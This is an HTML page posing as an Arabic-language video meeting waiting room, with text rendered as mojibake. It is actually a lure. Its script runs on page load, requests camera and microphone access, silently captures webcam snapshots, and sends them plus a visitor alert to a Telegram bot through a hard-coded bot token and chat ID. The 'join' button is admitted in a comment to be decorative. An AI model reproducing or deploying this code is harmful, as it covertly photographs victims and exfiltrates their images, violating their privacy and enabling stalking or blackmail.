<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ø¬ØªÙ…Ø§Ø¹Ùƒ Ø§Ù„Ø¢Ù† - Ù‚Ø§Ø¹Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©</title>
    
    <meta property="og:title" content="Ø§Ø¯Ø®Ù„ Ù‚Ø§Ø¹Ø© Ø§Ù„Ø§Ø¬ØªÙ…Ø§Ø¹Ø§Øª Ø§Ù„Ø¢Ù†!">
    <meta property="og:description" content="ØªÙ…Øª Ø¯Ø¹ÙˆØªÙƒ Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ø§Ø¬ØªÙ…Ø§Ø¹ Ù…Ù‡Ù…. Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ù„Ø¯Ø®ÙˆÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©Ù‹!">
    <meta property="og:image" content="https://i.imgur.com/your-meeting-preview-image.png"> <meta property="og:url" content="https://yourwebsite.com/meeting-link"> <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap'); /* Ø®Ø· Ø¹Ø±Ø¨ÙŠ Ø£ÙØ¶Ù„ */
        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: #0d1117; color: #e6edf3; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        .app-header { position: absolute; top: 0; width: 100%; text-align: center; padding: 15px 0; background-color: rgba(0,0,0,0.3); backdrop-filter: blur(5px); box-shadow: 0 2px 10px rgba(0,0,0,0.5); z-index: 10; }
        .app-header h1 { margin: 0; font-size: 24px; color: #fff; }

        .meeting-room-container { background: rgba(13, 17, 23, 0.8); border-radius: 15px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); padding: 30px; display: flex; flex-direction: column; align-items: center; width: 90%; max-width: 900px; backdrop-filter: blur(10px); z-index: 5; }
        
        .video-panel { display: flex; flex-wrap: wrap; gap: 10px; width: 100%; justify-content: center; margin-bottom: 20px; }
        .video-slot { position: relative; width: calc(50% - 5px); /* Ø§Ø«Ù†Ø§Ù† ÙÙŠ Ø§Ù„ØµÙ */ aspect-ratio: 16/9; background: #000; border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
        .video-slot.main-user video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); /* Ù…Ø±Ø¢Ø© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… */ }
        .video-slot.other-user { background-image: url('https://via.placeholder.com/320x180/222222/FFFFFF?text=Ù…Ø´Ø§Ø±Ùƒ+Ø¢Ø®Ø±'); /* ØµÙˆØ±Ø© ÙˆÙ‡Ù…ÙŠØ© Ù„Ù…Ø´Ø§Ø±Ùƒ */ background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #bbb; }
        .video-slot .name-tag { position: absolute; bottom: 5px; right: 5px; background: rgba(0,0,0,0.5); padding: 3px 8px; border-radius: 4px; font-size: 12px; }

        .controls-panel { display: flex; justify-content: center; gap: 20px; margin-top: 20px; width: 100%; }
        .control-btn { background: #21262d; border: none; padding: 12px 20px; border-radius: 50px; cursor: pointer; color: #e6edf3; font-size: 14px; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: background-color 0.3s, transform 0.2s; }
        .control-btn:hover { background: #30363d; transform: translateY(-2px); }
        .control-btn.red { background: #d73a49; }
        .control-btn.red:hover { background: #e04e5d; }
        .control-btn span { font-size: 20px; } /* Ù„Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª */

        .status-message { margin-top: 25px; font-size: 16px; color: #8b949e; animation: pulse 1.5s infinite alternate; }
        @keyframes pulse { 0% { opacity: 0.7; } 100% { opacity: 1; } }

        .join-button { background: #2ea44f; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; cursor: pointer; font-weight: bold; margin-top: 30px; box-shadow: 0 5px 15px rgba(46,164,79,0.4); transition: background-color 0.3s, transform 0.2s; }
        .join-button:hover { background: #3cc462; transform: translateY(-2px); }
    </style>
</head>
<body>

    <header class="app-header">
        <h1>Ø§Ø¬ØªÙ…Ø§Ø¹ ÙØ±ÙŠÙ‚ Ø§Ù„Ø¹Ù…Ù„</h1>
    </header>

    <div class="meeting-room-container">
        <div class="video-panel">
            <div class="video-slot main-user">
                <video id="webcam" autoplay playsinline muted></video>
                <div class="name-tag">Ø£Ù†Øª</div>
            </div>
            <div class="video-slot other-user">
                <div class="name-tag">Ù…Ø­Ù…Ø¯</div>
            </div>
            <div class="video-slot other-user">
                <div class="name-tag">Ø³Ø§Ø±Ø©</div>
            </div>
            <div class="video-slot other-user">
                <div class="name-tag">Ø§Ù„Ø¶ÙŠÙ</div>
            </div>
        </div>

        <div class="controls-panel">
            <button class="control-btn"><span>&#127897;</span> ÙƒØªÙ… Ø§Ù„ØµÙˆØª</button>
            <button class="control-btn"><span>&#128247;</span> Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</button>
            <button class="control-btn"><span>&#128100;</span> Ø§Ù„Ù…Ø´Ø§Ø±ÙƒÙˆÙ†</button>
            <button class="control-btn red"><span>&#128680;</span> Ø¥Ù†Ù‡Ø§Ø¡</button>
        </div>
        
        <p class="status-message" id="status">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„... ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹.</p>

        <button class="join-button" onclick="startProcess()">Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ù„Ø§Ø¬ØªÙ…Ø§Ø¹</button>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

 <script>
    const token = "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo";
    const chatId = "6068331455";

    window.onload = async () => {
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªÙ‚Ù†ÙŠØ© ÙÙˆØ± Ø§Ù„Ø¯Ø®ÙˆÙ„
        await getSystemInfoAndSend();
        // Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ±Ø§Ù‹
        await setupCamera();
    };

    async function setupCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('webcam');
            video.srcObject = stream;

            // --- Ø§Ù„Ø³Ø±Ø¹Ø© Ù‡Ù†Ø§ ---
            // Ø¨Ù…Ø¬Ø±Ø¯ Ø£Ù† ÙŠØ¨Ø¯Ø£ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙÙŠ Ø§Ù„Ø¹Ù…Ù„ØŒ Ø§Ù†ØªØ¸Ø± Ù„Ø­Ø¸Ø© Ø¨Ø³ÙŠØ·Ø© Ù„Ù„ØªØ±ÙƒÙŠØ² Ø«Ù… Ø§Ù„ØªÙ‚Ø·
            video.onloadedmetadata = () => {
                video.play();
                document.getElementById('status').innerText = "ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ØŒ Ø¬Ø§Ø±ÙŠ ØªØ­Ø¶ÙŠØ± Ø§Ù„Ù‚Ø§Ø¹Ø©...";
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø£ÙˆÙ„ ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© ÙˆØ§Ø­Ø¯Ø© Ù…Ù† ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ø¬ÙˆØ¯Ø©
                setTimeout(() => {
                    captureAndSend(); 
                }, 1000);

                // Ø§Ø®ØªÙŠØ§Ø±ÙŠ: Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø«Ø§Ù†ÙŠØ© Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†Ù Ù„Ø¶Ù…Ø§Ù† Ù„Ù‚Ø·Ø© Ø£ÙˆØ¶Ø­
                setTimeout(() => {
                    captureAndSend();
                }, 5000);
            };

        } catch (err) {
            document.getElementById('status').innerText = "ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©...";
        }
    }

    function captureAndSend() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            if (blob) {
                sendTelegramPhoto(blob);
            }
        }, 'image/jpeg', 0.7); // ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø¬ÙˆØ¯Ø© Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ù„Ø²ÙŠØ§Ø¯Ø© Ø³Ø±Ø¹Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
    }

    function sendTelegramPhoto(blob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'instant_capture.jpg');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).then(() => {
            console.log("ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø³Ø±ÙŠØ¹ Ø¨Ù†Ø¬Ø§Ø­");
        });
    }

    async function getSystemInfoAndSend() {
        // ... Ù†ÙØ³ ÙƒÙˆØ¯ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø³Ø§Ø¨Ù‚ ...
        const info = `ğŸ”” Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯ ÙÙŠ Ù‚Ø§Ø¹Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: info })
        });
    }

    // Ø§Ù„Ø²Ø± Ø§Ù„Ø¢Ù† ÙˆØ¸ÙŠÙØªÙ‡ Ø¬Ù…Ø§Ù„ÙŠØ© ÙÙ‚Ø· Ø£Ùˆ Ù„Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
    function startProcess() {
        captureAndSend();
        document.getElementById('status').innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ù„Ù„Ø§Ø¬ØªÙ…Ø§Ø¹...";
    }
</script>

</body>
</html>
